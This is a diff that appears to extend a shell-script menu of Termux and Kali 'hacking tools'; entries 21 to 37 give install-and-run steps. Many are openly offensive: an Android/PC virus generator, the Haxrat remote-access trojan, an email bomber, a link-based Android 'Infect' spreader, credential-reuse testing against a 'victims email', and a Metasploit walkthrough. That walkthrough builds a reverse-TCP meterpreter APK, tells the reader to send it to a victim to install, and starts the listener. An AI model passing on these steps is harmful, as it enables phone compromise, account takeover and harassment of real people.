@@ -1016,5 +1016,832 @@ For further practical guidence or usage choose below options video/post
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 ↦ by Akash hacker 
 
+=========================&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Malicious] number 21  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Malicious is a tool which can generate android and pc virus by simple steps.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install git 
+
+$ pkg install python2 
+
+$ pkg install ruby
+
+$ gem install lolcat 
+
+$ git clone https://github.com/BarrierJR/CyberEr0r
+
+$ cd CyberEr0r
+
+$ pip2 install -r requirements.txt
+
+$ python2 malicious.py
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Haxrat] number 22  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Haxrat is a nodejs based web and client supported rat for android device's with most advanced option's to hack android devices.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 400 MB data
+↦ 800 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install nodejs
+
+$ pkg install git -y
+
+$ git clone https://github.com/hax4us/haxRat
+
+$ ls
+
+$ cd haxRat/server
+
+$ npm install
+
+$ mkdir ~/haxrat
+
+$ node index.js
+
+Note: In your browser navigate to http://<SERVER IP>:22533 & Login with default username and password ( By default server will run on localhost and to make a client APP you can use PORTMAP to access APP on wide area network.
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦by Akash hacket
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Credmap] number 23  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Credmap is an open source tool that was created to bring awareness to the dangers of credential reuse. It is capable of testing supplied user credentials on
+several known websites to test if the password has been reused on any of these.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python
+
+$ pkg install python2
+
+$ pkg install git 
+
+$ git clone https://github.com/lightos/credmap
+
+$ ls
+
+$ cd credmap
+
+$ chmod +x credmap.py
+
+$ python2 credmap.py
+
+$ python2 credmap.py  --username noobhackers --email victims email
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Adminpanel] number 24  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Admin panel finder is a tool which is used to find the admin panel in vulnerable websites like WordPress and joomla etc.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python2
+
+$ pkg install python
+
+$ pkg install git
+
+$ git clone https://github.com/bdblackhat/admin-panel-finder
+
+$ ls
+
+$ cd admin_panel_finder
+
+$ chmod +x
+ admin_panel_finder.py
+
+$ python2 admin_panel_finder.py
+
+Copy the link of (wp login.php) or anything named like this and paste it in chrome .....
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Globeintermux] number 25  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Create awesome world globe in termux without root.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+curl -s http://artscene.textfiles.com/vt100/movglobe.vt | pv -q -L 9600
+
+ship
+
+curl -s http://artscene.textfiles.com/vt100/sship.vt | pv -q -L 9600
+
+curl -s http://artscene.textfiles.com/vt100/glass.vt | pv -q -L 9600
+
+curl -s http://artscene.textfiles.com/vt100/frogs.vt | pv -q -L 9600
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker 
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Emailbomber] number 26  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ From this tool/script you can do email bombing in termux or kali.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install git
+
+$ pkg install python2
+
+$ pkg install python
+
+$ ls
+
+$ git clone https://github.com/mohinparamasivam/Email_Bomber
+
+$ cd Email_Bomber
+
+$ ls
+
+$ python emailbomber.py
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Termuxstyling] number 27  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Style termux like pro with zsh shell.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+https://raw.githubusercontent.com/Cabbagec/termux-ohmyzsh/master/install.sh
+
+how to change termux look
+great look of termux no root
+
+copy and paste the command in termux
+
+$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/Cabbagec/termux-ohmyzsh/master/install.sh )"
+
+????change background colour????
+
+$ ~/.termux/colors.sh
+
+????change fonts????
+
+$ ~/.termux/fonts.sh
+
+flglet fonts
+$ pkg install figlet
+
+screenfetch
+$ pkg install screenfetch
+
+matrix effect
+$ pkg install matrix 
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Theinspector] number 28  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Web vulnerability checking tool for termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ apt-get update
+
+$ pkg install curl git perl
+
+$ pkg install git
+
+$ git clone https://github.com/Moham3dRiahi/Th3inspector
+
+$ ls
+
+$ cd Th3inspector
+
+$ ls
+
+$ perl Th3inspector.pl
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Blackbox] number 29  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Blackbox is a tool which has cracking tools include dork and others...
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python 
+
+$ pkg install python2
+
+$ pkg install wget
+
+$ wget https://raw.githubusercontent.com/jothatron/blackbox/master/blackbox.py
+
+$ ls
+
+$ chmod +x blackbox.py
+
+$ pip2 install requests pexpect passlib
+
+$ ls
+
+$ python2 blackbox.py -h
+
+$ python2 blackbox.py
+ google_dorker -h 
+
+
+
+
+
+By Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
+Tool Name: [Littlebrother] number 30  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Littlebrother tool is made for information gathering in termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python
+
+$ pkg install python2
+
+$ git clone https://github.com/lulz3xploit/LittleBro
+rother
+
+$ python3 -m pip install -r requirement.txt
+
+$ python3 Littlebrother.py
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+ &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
+Tool Name: [Crips] number 31  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Crips tool is a web vulnerability scanner for termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python
+
+$ pkg install python2
+
+$ pkg install git
+
+$ git cone https://github.com/Manisso/Crips
+
+$ ls
+
+$ cd Crips
+
+$ chmod +x crips.py
+
+$ python2 crips.py
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Nikto] number 32  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Nikto is a web vunerability scanning tool for termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install perl
+
+$ pkg install git
+
+$ git clone  https://github.com/sullo/nikto
+
+$ ls
+
+$ cd nikto
+
+$ ls
+
+$ cd program
+
+$ perl nikto.pl -h 
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Metasploitusage] number 33  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Metasploit installation and usage guide.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 600 MB data
+↦ 800 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+What is payload ?
+
+A payload is a malware function of Trojan horse which transmit data from victim to attacker these type of malwares is called payload. 
+
+$ apt-get update
+
+$ apt-get updgrade
+
+$ pkg install unstable-repo OR apt install unstable-repo
+
+$ pkg install metasploit OR apt install metasploit
+
+After installation 
+
+$ ./msfconsole 
+
+Wait 2min until open 
+
+$ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=(your IP) LPORT=4444 R > /sdcard /shell.apk
+
+Want IP go to google search what is my IPv4 address 1st link open copy your ip
+
+Payload is on internal storage send payload to victim install it on victim mobile
+
+$ pkg install postgresql
+
+$ pg_ctl -D $PREFIX/var/lib/postgresql start
+
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=ip R > /sdcard/name.apk
+
+$ ./msfconsole
+
+$ use exploit/multi/handler
+
+$ set payload android/meterpreter/reverse_tcp
+
+$ set LHOST (ip)
+
+$ set LPORT (port number)
+
+$ exploit
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by  Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Infect] number 34  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Infect tool is used to spread virus android virus from just link.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ apt-get update -y
+
+$ apt-get upgrade -y
+
+$ pkg install python -y
+
+$ pkg install python2 -y
+
+$ pkg install git -y
+
+$ pip install lolcat
+
+$ git clone https://github.com/noob-hackers/Infect
+
+$ ls
+
+$ cd infect
+
+$ ls
+
+$ bash infect.sh 
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
+Tool Name: [Tplay] number 35  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ tplay is a command based mp3 player for termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python
+
+$ pkg install python2
+
+$ pkg install git
+
+$ git clone https://github.com/TheSpeedX/TPlay
+
+$ cd TPlay
+
+$ chmod +x setup.sh
+
+$ ./setup.sh
+
+Available Commands are:
+
+play - Plays Paused Music
+play <track_number> - Plays The Song With That Track Number ( EX- play 3 )
+pause - Pauses Playing Music
+next - Plays Next Song
+prev - Plays Previous Song
+random - Plays Random Song
+quit / exit - Stops Playing Music And Exits Player
+info - Gets Info of Currently Playing Song
+reload - Rescans The Phone Memory For MP3 files and creates A Playlist
+ref - Refreshes The Screen
+remove <track_number> - Removes Song With Respective Number From PlayList
+sort - Sort The List According To Path
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Proxygrabber] number 36  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Grab proxy in termux with fresh updates and get public proxies free without root.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+↦ KALI LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ pkg install python
+
+$ pkg install python2
+
+$ pkg install git
+
+$ git clone https://github.com/sabri-zaki/PROXY_FINDER
+
+$ cd proxy-feeder
+
+$ chmod +x *
+
+$ ./setup.sh
+
+wait for installation to finish
+
+$ python proxy-feeder.py
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Tool Name: [Ubuntu] number 37  ⊛
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+About Tool:
+
+↦ Ubuntu is a os officially for laptop and computers and even from this tool you can use ubuntu in termux.
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Available For:
+
+↦ TERMUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Requirements:
+
+↦ 100 MB data
+↦ 200 MB storage
+↦ No root
+↦ Data Connection
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Installation & Usage:
+
+$ apt-get update
+
+$ pkg install git wget proot -y
+
+$ git clone https://github.com/htr-tech/ubuntu
+
+$ cd ubuntu
+
+$ chmod +x ubuntu.sh
+
+$ bash ubuntu.sh
+
+Now you need internet connection to continue further process...
+
+$ bash start.sh
+
+To logout
+
+$ logout
+
+For further practical guidence or usage choose below options video/post
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+↦by Akash hacker 
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+↦ by Akash hacker
+
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
 ========================================================
-     : "
+     ========================================================
+     :
+&&         &   &        &&
+     &  &        &  &        &  &
+    &    &       & &        &    &
+   &&&&&&&&      &&        &&&&&&&&
+  &        &     & &      &        &
+ &          &    &  &    &          &
+&            &   &   &  &            &                &&  >
+     &  &            &             &          &
+    &    &           &             &          &
+   &&&&&&&&          &&&&&&&&      &&&&&&&&&&&&
+  &        &                &      &          &
+ &          &               &      &          &
+&            &       &&&&&&&&      &          &
+========================================================
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& 
+
+----------------TOOL 40 + TOOL FULL TUTARIAL -----------
+
+===============CODDED BY AKASH HACKER===================
+
+==============SCROOL DOWN TOOL LOOK ==================="
+#
+echo " plese enter ist number "
+read a
+
